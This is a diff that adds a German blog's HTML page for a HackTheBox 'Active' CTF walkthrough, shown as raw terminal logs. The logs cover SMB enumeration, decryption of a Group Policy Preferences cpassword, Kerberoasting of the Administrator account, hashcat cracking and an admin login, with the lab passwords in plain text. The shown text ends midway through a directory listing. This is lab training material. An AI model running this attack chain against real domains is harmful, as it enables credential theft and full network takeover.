@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="m10x ">
+<meta name="description" content="https://github.com/SecureAuthCorp/impacket
+https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py
+root@kali:~/active# nmap -sV -sC 10.10.10.100
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-07 10:11 CET
+Nmap scan report for 10.10.10.100
+Host is up (0.022s latency).
+Not shown: 983 closed ports
+PORT STATE SERVICE VERSION
+53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid:
+|_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2018-12-07 09:12:05Z)
+135/tcp open msrpc Microsoft Windows RPC" />
+<meta name="keywords" content=", hackthebox, ctf" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://m10x.github.io/posts/2010/01/hackthebox-active/" />
+
+
+    <title>
+        
+            HackTheBox - Active :: Maximilian Hildebrand  — German Penetration Testing Blog
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://m10x.github.io/main.d7bdd8ee18bfbf4c605488a7e5b1b92cd980dfeed2bdaeab4dd5e931a7a78bc0.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://m10x.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://m10x.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://m10x.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://m10x.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://m10x.github.io/safari-pinned-tab.svg" color="#1b1c1d">
+    <link rel="shortcut icon" href="https://m10x.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="#1b1c1d">
+    <meta name="theme-color" content="#1b1c1d">
+
+
+
+<meta itemprop="name" content="HackTheBox - Active">
+<meta itemprop="description" content="https://github.com/SecureAuthCorp/impacket
+https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py
+root@kali:~/active# nmap -sV -sC 10.10.10.100
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-07 10:11 CET
+Nmap scan report for 10.10.10.100
+Host is up (0.022s latency).
+Not shown: 983 closed ports
+PORT STATE SERVICE VERSION
+53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid:
+|_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2018-12-07 09:12:05Z)
+135/tcp open msrpc Microsoft Windows RPC"><meta itemprop="datePublished" content="2010-01-01T01:01:56&#43;01:00" />
+<meta itemprop="dateModified" content="2010-01-01T01:01:56&#43;01:00" />
+<meta itemprop="wordCount" content="1464"><meta itemprop="image" content="https://m10x.github.io/"/>
+<meta itemprop="keywords" content="hackthebox,ctf," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://m10x.github.io/"/>
+
+<meta name="twitter:title" content="HackTheBox - Active"/>
+<meta name="twitter:description" content="https://github.com/SecureAuthCorp/impacket
+https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py
+root@kali:~/active# nmap -sV -sC 10.10.10.100
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-07 10:11 CET
+Nmap scan report for 10.10.10.100
+Host is up (0.022s latency).
+Not shown: 983 closed ports
+PORT STATE SERVICE VERSION
+53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid:
+|_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2018-12-07 09:12:05Z)
+135/tcp open msrpc Microsoft Windows RPC"/>
+
+
+
+
+    <meta property="og:title" content="HackTheBox - Active" />
+<meta property="og:description" content="https://github.com/SecureAuthCorp/impacket
+https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py
+root@kali:~/active# nmap -sV -sC 10.10.10.100
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-07 10:11 CET
+Nmap scan report for 10.10.10.100
+Host is up (0.022s latency).
+Not shown: 983 closed ports
+PORT STATE SERVICE VERSION
+53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid:
+|_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2018-12-07 09:12:05Z)
+135/tcp open msrpc Microsoft Windows RPC" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://m10x.github.io/posts/2010/01/hackthebox-active/" /><meta property="og:image" content="https://m10x.github.io/"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2010-01-01T01:01:56&#43;01:00" />
+<meta property="article:modified_time" content="2010-01-01T01:01:56&#43;01:00" />
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2010-01-01 01:01:56 &#43;0100 CET" />
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://m10x.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">$ cd /home/m10x/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://m10x.github.io/about/">About</a></li><li><a href="https://m10x.github.io/summary/">Summary</a></li><li><a href="https://m10x.github.io/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        7 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://m10x.github.io/posts/2010/01/hackthebox-active/">HackTheBox - Active</a>
+      </h1>
+
+      
+
+      
+
+      <div class="post-content">
+        <p><a href="http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE"><img src="http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg" alt="Kurzes Video Walkthrough ohne Erklärungen"></a></p>
+<p><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
+<p><a href="https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py">https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py</a></p>
+<p>root@kali:~/active# nmap -sV -sC 10.10.10.100<br>
+Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2018-12-07 10:11 CET<br>
+Nmap scan report for 10.10.10.100<br>
+Host is up (0.022s latency).<br>
+Not shown: 983 closed ports<br>
+PORT STATE SERVICE VERSION<br>
+53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)<br>
+| dns-nsid:<br>
+|_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)<br>
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2018-12-07 09:12:05Z)<br>
+135/tcp open msrpc Microsoft Windows RPC<br>
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn<br>
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)<br>
+445/tcp open microsoft-ds?<br>
+464/tcp open kpasswd5?<br>
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0<br>
+636/tcp open tcpwrapped<br>
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)<br>
+3269/tcp open tcpwrapped<br>
+49152/tcp open msrpc Microsoft Windows RPC<br>
+49153/tcp open msrpc Microsoft Windows RPC<br>
+49154/tcp open msrpc Microsoft Windows RPC<br>
+49155/tcp open msrpc Microsoft Windows RPC<br>
+49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0<br>
+49158/tcp open msrpc Microsoft Windows RPC<br>
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows</p>
+<p>Host script results:<br>
+| smb2-security-mode:<br>
+| 2.02:<br>
+|_ Message signing enabled and required<br>
+| smb2-time:<br>
+| date: 2018-12-07 10:13:01<br>
+|_ start_date: 2018-12-07 09:42:16</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>
+Nmap done: 1 IP address (1 host up) scanned in 151.38 seconds</p>
+<p>root@kali:~/active# python smbclient.py 10.10.10.100<br>
+Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation</p>
+<p>Type help for list of commands</p>
+<h1 id="shares">shares</h1>
+<p>ADMIN$<br>
+C$<br>
+IPC$<br>
+NETLOGON<br>
+Replication<br>
+SYSVOL<br>
+Users</p>
+<h1 id="use-replication">use Replication</h1>
+<h1 id="ls">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 active.htb</p>
+<h1 id="cd-activehtb">cd active.htb</h1>
+<h1 id="ls-1">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 DfsrPrivate<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 Policies<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 scripts</p>
+<h1 id="cd-policies">cd Policies</h1>
+<h1 id="ls-2">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 {31B2F340-016D-11D2-945F-00C04FB984F9}<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 {6AC1786C-016F-11D2-945F-00C04fB984F9}</p>
+<h1 id="cd-31b2f340-016d-11d2-945f-00c04fb984f9">cd {31B2F340-016D-11D2-945F-00C04FB984F9}</h1>
+<h1 id="ls-3">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..<br>
+-rw-rw-rw- 23 Sat Jul 21 12:38:11 2018 GPT.INI<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 Group Policy<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 MACHINE<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 USER</p>
+<h1 id="cd-machine">cd machine</h1>
+<h1 id="ls-4">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 Microsoft<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 Preferences<br>
+-rw-rw-rw- 2788 Sat Jul 21 12:38:11 2018 Registry.pol</p>
+<h1 id="cd-preferences">cd Preferences</h1>
+<h1 id="ls-5">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 Groups</p>
+<h1 id="cd-groups">cd Groups</h1>
+<h1 id="ls-6">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..<br>
+-rw-rw-rw- 533 Sat Jul 21 12:38:11 2018 Groups.xml</p>
+<h1 id="get-groupsxml">get Groups.xml</h1>
+<h1 id="exit">exit</h1>
+<p>root@kali:~/active# cat Groups.xml</p>
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->&lt;Properties action=&ldquo;U&rdquo; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&ldquo;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&rdquo; changeLogon=&ldquo;0&rdquo; noChange=&ldquo;1&rdquo; neverExpires=$<br>
+1&quot; acctDisabled=&ldquo;0&rdquo; userName=&ldquo;active.htb\SVC_TGS&rdquo;/&gt;<!-- raw HTML omitted --><br>
+<!-- raw HTML omitted --></p>
+<p>root@kali:~/active# python gpprefdecrypt.py edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ<br>
+GPPstillStandingStrong2k18<br>
+root@kali:~/active# python smbclient.py SVC_TGS:GPPstillStandingStrong2k18@10.10.10.100<br>
+Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation</p>
+<p>Type help for list of commands</p>
+<h1 id="shares-1">shares</h1>
+<p>ADMIN$<br>
+C$<br>
+IPC$<br>
+NETLOGON<br>
+Replication<br>
+SYSVOL<br>
+Users</p>
+<h1 id="use-users">use users</h1>
+<h1 id="ls-7">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 16:39:20 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 16:39:20 2018 ..<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:21 2018 Administrator<br>
+drw-rw-rw- 0 Mon Jul 16 23:08:56 2018 All Users<br>
+drw-rw-rw- 0 Mon Jul 16 23:08:47 2018 Default<br>
+drw-rw-rw- 0 Mon Jul 16 23:08:56 2018 Default User<br>
+-rw-rw-rw- 174 Mon Jul 16 23:01:17 2018 desktop.ini<br>
+drw-rw-rw- 0 Mon Jul 16 23:08:47 2018 Public<br>
+drw-rw-rw- 0 Sat Jul 21 17:16:32 2018 SVC_TGS</p>
+<h1 id="cd-svc_tgs">cd SVC_TGS</h1>
+<h1 id="ls-8">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 17:16:32 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 17:16:32 2018 ..<br>
+drw-rw-rw- 0 Sat Jul 21 17:14:20 2018 Contacts<br>
+drw-rw-rw- 0 Sat Jul 21 17:14:42 2018 Desktop<br>
+drw-rw-rw- 0 Sat Jul 21 17:14:28 2018 Downloads<br>
+drw-rw-rw- 0 Sat Jul 21 17:14:50 2018 Favorites<br>
+drw-rw-rw- 0 Sat Jul 21 17:15:00 2018 Links<br>
+drw-rw-rw- 0 Sat Jul 21 17:15:23 2018 My Documents<br>
+drw-rw-rw- 0 Sat Jul 21 17:15:40 2018 My Music<br>
+drw-rw-rw- 0 Sat Jul 21 17:15:50 2018 My Pictures<br>
+drw-rw-rw- 0 Sat Jul 21 17:16:05 2018 My Videos<br>
+drw-rw-rw- 0 Sat Jul 21 17:16:20 2018 Saved Games<br>
+drw-rw-rw- 0 Sat Jul 21 17:16:32 2018 Searches</p>
+<h1 id="cd-desktop">cd Desktop</h1>
+<h1 id="ls-9">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 17:14:42 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 17:14:42 2018 ..<br>
+-rw-rw-rw- 34 Sat Jul 21 17:14:42 2018 user.txt</p>
+<h1 id="get-usertxt">get user.txt</h1>
+<h1 id="exit-1">exit</h1>
+<p>root@kali:~/active# cat user.txt<br>
+86d#########ZENSIERT#########983</p>
+<p>root@kali:~/active# python GetUserSPNs.py -dc-ip 10.10.10.100 -request active.htb/SVC_TGS:GPPstillStandingStrong2k18<br>
+Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation</p>
+<p>ServicePrincipalName Name MemberOf PasswordLastSet LastLogon</p>
+<hr>
+<p>active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 21:06:40 2018-07-30 19:17:40</p>
+<p>$krb5tgs$23$<em>Administrator$ACTIVE.HTB$active/CIFS~445</em>$10589d87c1a98b404545a09ac0edbec8$9470373fe8ddd05e0cb35e6307ce19f2b782e291b568af5f62b6096dfb46dee03cd8add92816c256b21fc8c475acdf49e825e2f32a361bd4b94b9d56eb7<br>
+de54b8a728752c6f7e50ceb6024d388b4ba99ba4a02dd3975355f49f9184f1e6b7606f5554d5e45d28693a5aef90f0591d36567d0e8c641e16e7c8d05047b2d9d2040e5be0a37abcb7e0e106f0a98f5861f000506daef442270dba05d0a0b593a86cd2cfb231ed9a623<br>
+da2ec87bfd185a90c79baf2d05b9f6a0edd79c9a25a2087f22211dc99749099ac091fceab6647e6da19164dba1bd174df0bb0e3f82ba790f840b7b0d19fbc8d4e21077b9f7dc45cfc9e54ce9b788293c6d222504fdc995923ad940bdfc80da606708f0485b448a9e689<br>
+d165f07b1d5da0f249c5db85d98d54be7d3a985808cfee3bbeb3f875eb33e6b818ed5d2f699960280092ebf9506d0510bb3f23fd1d94ce0ee3cbd3066240ddeda67986a5b70334baea5dbd88743fb3ef843ea170ecd38469a5fa1dc957566579ea25ec3c81f0e8dbaa6<br>
+8e0c203409ebedd098cc928cab4632c401d7c5a64cc997ed3ec6e87b37b44d5dc349c25edf41623df54cde4cc356fe1023ac62684a9278bf0756d46634eb1a0379d614dd78488293b8e7a7e770ac078afdc6b60f0edd4c336557a6791c398126c61c9e546894e29d5d7<br>
+ae3111e13fbdd4c7b68be0d7e71520d3f7f1ec6826fe24683a7c9c32a16c28221ebd8b4fe61a189cfce3d2115d9840aa9e3d77a46077d05a6cca034a81117f1240fc21c9ccaba16c5bed6815a8338b75dc293b193f45b8354e0f5aa2acad7c1606bd5d30651e9661663<br>
+211b1e11c07073c9d932e157073fd8940055a1fb2c03260af72a521c9f633412b3d1bf9e9e21b755a92d812a1e6061dff7c0564286a0c897e6be885a8fdb8b48c6314ed2d118d504675b9935f65eafecd69f57894fdee85a32950f9ef8f21c5f6010019837d1fa1cd68<br>
+8161cf02a9e6eb47041a83258353fb2fdd434a20de6362cb17f42b44b53f4f7b6ecd83d1b4c23698562a1ebe5b306bc6154aaaf3668738fb72078e90ad4ce5c72cd6f92df6d6747d6fcd7d23b9616a9fdbdd4312a25960102dc9b6985128e77fc7b6227bf27248efe90<br>
+f6637e0b98bb4a72e6e452b80931649dec99bf2e8fa3c418889a6d83576110f1ad655f3e67c798b724e7b8ae1512b32ab4dbb5e46f1fd278124ba952467ec27014f0ea8e88346db8949b6c606fc9d7081ad03b85d7fa15b96a60<br>
+root@kali:~/active# echo &lsquo;$krb5tgs$23$<em>Administrator$ACTIVE.HTB$active/CIFS~445</em>$10589d87c1a98b404545a09ac0edbec8$9470373fe8ddd05e0cb35e6307ce19f2b782e291b568af5f62b6096dfb46dee03cd8add92816c256b21fc8c475acdf49e<br>
+825e2f32a361bd4b94b9d56eb7de54b8a728752c6f7e50ceb6024d388b4ba99ba4a02dd3975355f49f9184f1e6b7606f5554d5e45d28693a5aef90f0591d36567d0e8c641e16e7c8d05047b2d9d2040e5be0a37abcb7e0e106f0a98f5861f000506daef442270dba05d<br>
+0a0b593a86cd2cfb231ed9a623da2ec87bfd185a90c79baf2d05b9f6a0edd79c9a25a2087f22211dc99749099ac091fceab6647e6da19164dba1bd174df0bb0e3f82ba790f840b7b0d19fbc8d4e21077b9f7dc45cfc9e54ce9b788293c6d222504fdc995923ad940bdf<br>
+c80da606708f0485b448a9e689d165f07b1d5da0f249c5db85d98d54be7d3a985808cfee3bbeb3f875eb33e6b818ed5d2f699960280092ebf9506d0510bb3f23fd1d94ce0ee3cbd3066240ddeda67986a5b70334baea5dbd88743fb3ef843ea170ecd38469a5fa1dc95<br>
+7566579ea25ec3c81f0e8dbaa68e0c203409ebedd098cc928cab4632c401d7c5a64cc997ed3ec6e87b37b44d5dc349c25edf41623df54cde4cc356fe1023ac62684a9278bf0756d46634eb1a0379d614dd78488293b8e7a7e770ac078afdc6b60f0edd4c336557a6791<br>
+c398126c61c9e546894e29d5d7ae3111e13fbdd4c7b68be0d7e71520d3f7f1ec6826fe24683a7c9c32a16c28221ebd8b4fe61a189cfce3d2115d9840aa9e3d77a46077d05a6cca034a81117f1240fc21c9ccaba16c5bed6815a8338b75dc293b193f45b8354e0f5aa2a<br>
+cad7c1606bd5d30651e9661663211b1e11c07073c9d932e157073fd8940055a1fb2c03260af72a521c9f633412b3d1bf9e9e21b755a92d812a1e6061dff7c0564286a0c897e6be885a8fdb8b48c6314ed2d118d504675b9935f65eafecd69f57894fdee85a32950f9ef<br>
+8f21c5f6010019837d1fa1cd688161cf02a9e6eb47041a83258353fb2fdd434a20de6362cb17f42b44b53f4f7b6ecd83d1b4c23698562a1ebe5b306bc6154aaaf3668738fb72078e90ad4ce5c72cd6f92df6d6747d6fcd7d23b9616a9fdbdd4312a25960102dc9b6985<br>
+128e77fc7b6227bf27248efe90f6637e0b98bb4a72e6e452b80931649dec99bf2e8fa3c418889a6d83576110f1ad655f3e67c798b724e7b8ae1512b32ab4dbb5e46f1fd278124ba952467ec27014f0ea8e88346db8949b6c606fc9d7081ad03b85d7fa15b96a60&rsquo; &gt; s<br>
+pn.txt<br>
+root@kali:~/active# hashcat -m 13100 -a 0 spn.txt /usr/share/wordlists/rockyou.txt<br>
+hashcat (v5.0.0) starting…</p>
+<h1 id="opencl-platform-1-the-pocl-project">OpenCL Platform #1: The pocl project</h1>
+<ul>
+<li>Device #1: pthread-AMD Ryzen 7 1700 Eight-Core Processor, 1024/2295 MB allocatable, 4MCU</li>
+</ul>
+<p>Hashes: 1 digests; 1 unique digests, 1 unique salts<br>
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>
+Rules: 1</p>
+<p>Applicable optimizers:</p>
+<ul>
+<li>Zero-Byte</li>
+<li>Not-Iterated</li>
+<li>Single-Hash</li>
+<li>Single-Salt</li>
+</ul>
+<p>Minimum password length supported by kernel: 0<br>
+Maximum password length supported by kernel: 256</p>
+<p>ATTENTION! Pure (unoptimized) OpenCL kernels selected.<br>
+This enables cracking passwords and salts &gt; length 32 but for the price of drastically reduced performance.<br>
+If you want to switch to optimized OpenCL kernels, append -O to your commandline.</p>
+<p>Watchdog: Hardware monitoring interface not found on your system.<br>
+Watchdog: Temperature abort trigger disabled.</p>
+<ul>
+<li>Device #1: build_opts &lsquo;-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D D<br>
+GST_ELEM=4 -D KERN_TYPE=13100 -D _unroll&rsquo;<br>
+Dictionary cache hit:</li>
+<li>Filename..: /usr/share/wordlists/rockyou.txt</li>
+<li>Passwords.: 14344385</li>
+<li>Bytes…..: 139921507</li>
+<li>Keyspace..: 14344385</li>
+</ul>
+<p>$krb5tgs$23$<em>Administrator$ACTIVE.HTB$active/CIFS~445</em>$10589d87c1a98b404545a09ac0edbec8$9470373fe8ddd05e0cb35e6307ce19f2b782e291b568af5f62b6096dfb46dee03cd8add92816c256b21fc8c475acdf49e825e2f32a361bd4b94b9d56eb7<br>
+de54b8a728752c6f7e50ceb6024d388b4ba99ba4a02dd3975355f49f9184f1e6b7606f5554d5e45d28693a5aef90f0591d36567d0e8c641e16e7c8d05047b2d9d2040e5be0a37abcb7e0e106f0a98f5861f000506daef442270dba05d0a0b593a86cd2cfb231ed9a623<br>
+da2ec87bfd185a90c79baf2d05b9f6a0edd79c9a25a2087f22211dc99749099ac091fceab6647e6da19164dba1bd174df0bb0e3f82ba790f840b7b0d19fbc8d4e21077b9f7dc45cfc9e54ce9b788293c6d222504fdc995923ad940bdfc80da606708f0485b448a9e689<br>
+d165f07b1d5da0f249c5db85d98d54be7d3a985808cfee3bbeb3f875eb33e6b818ed5d2f699960280092ebf9506d0510bb3f23fd1d94ce0ee3cbd3066240ddeda67986a5b70334baea5dbd88743fb3ef843ea170ecd38469a5fa1dc957566579ea25ec3c81f0e8dbaa6<br>
+8e0c203409ebedd098cc928cab4632c401d7c5a64cc997ed3ec6e87b37b44d5dc349c25edf41623df54cde4cc356fe1023ac62684a9278bf0756d46634eb1a0379d614dd78488293b8e7a7e770ac078afdc6b60f0edd4c336557a6791c398126c61c9e546894e29d5d7<br>
+ae3111e13fbdd4c7b68be0d7e71520d3f7f1ec6826fe24683a7c9c32a16c28221ebd8b4fe61a189cfce3d2115d9840aa9e3d77a46077d05a6cca034a81117f1240fc21c9ccaba16c5bed6815a8338b75dc293b193f45b8354e0f5aa2acad7c1606bd5d30651e9661663<br>
+211b1e11c07073c9d932e157073fd8940055a1fb2c03260af72a521c9f633412b3d1bf9e9e21b755a92d812a1e6061dff7c0564286a0c897e6be885a8fdb8b48c6314ed2d118d504675b9935f65eafecd69f57894fdee85a32950f9ef8f21c5f6010019837d1fa1cd68<br>
+8161cf02a9e6eb47041a83258353fb2fdd434a20de6362cb17f42b44b53f4f7b6ecd83d1b4c23698562a1ebe5b306bc6154aaaf3668738fb72078e90ad4ce5c72cd6f92df6d6747d6fcd7d23b9616a9fdbdd4312a25960102dc9b6985128e77fc7b6227bf27248efe90<br>
+f6637e0b98bb4a72e6e452b80931649dec99bf2e8fa3c418889a6d83576110f1ad655f3e67c798b724e7b8ae1512b32ab4dbb5e46f1fd278124ba952467ec27014f0ea8e88346db8949b6c606fc9d7081ad03b85d7fa15b96a60:Ticketmaster1968</p>
+<p>Session……….: hashcat<br>
+Status………..: Cracked<br>
+Hash.Type……..: Kerberos 5 TGS-REP etype 23<br>
+Hash.Target……: $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~4…b96a60<br>
+Time.Started…..: Fri Dec 7 10:25:31 2018 (13 secs)<br>
+Time.Estimated…: Fri Dec 7 10:25:44 2018 (0 secs)<br>
+Guess.Base…….: File (/usr/share/wordlists/rockyou.txt)<br>
+Guess.Queue……: 1/1 (100.00%)<br>
+Speed.#1………: 780.3 kH/s (10.58ms) @ Accel:64 Loops:1 Thr:64 Vec:8<br>
+Recovered……..: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts<br>
+Progress………: 10551296/14344385 (73.56%)<br>
+Rejected………: 0/10551296 (0.00%)<br>
+Restore.Point….: 10534912/14344385 (73.44%)<br>
+Restore.Sub.#1…: Salt:0 Amplifier:0-1 Iteration:0-1<br>
+Candidates.#1….: Tioncurtis23 -&gt; TUGGIE</p>
+<p>Started: Fri Dec 7 10:25:30 2018<br>
+Stopped: Fri Dec 7 10:25:45 2018<br>
+root@kali:~/active# python smbclient.py Administrator:Ticketmaster1968@10.10.10.100<br>
+Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation</p>
+<p>Type help for list of commands</p>
+<h1 id="use-users-1">use Users</h1>
+<h1 id="ls-10">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 16:39:20 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 16:39:20 2018 ..<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:21 2018 Administrator<br>
+drw-rw-rw- 0 Mon Jul 16 23:08:56 2018 All Users<br>
+drw-rw-rw- 0 Mon Jul 16 23:08:47 2018 Default<br>
+drw-rw-rw- 0 Mon Jul 16 23:08:56 2018 Default User<br>
+-rw-rw-rw- 174 Mon Jul 16 23:01:17 2018 desktop.ini<br>
+drw-rw-rw- 0 Mon Jul 16 23:08:47 2018 Public<br>
+drw-rw-rw- 0 Sat Jul 21 17:16:32 2018 SVC_TGS</p>
+<h1 id="cd-administrator">cd Administrator</h1>
+<h1 id="ls-11">ls</h1>
+<p>drw-rw-rw- 0 Mon Jul 16 12:14:21 2018 .<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:21 2018 ..<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 AppData<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 Application Data<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Contacts<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 Cookies<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Desktop<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Documents<br>
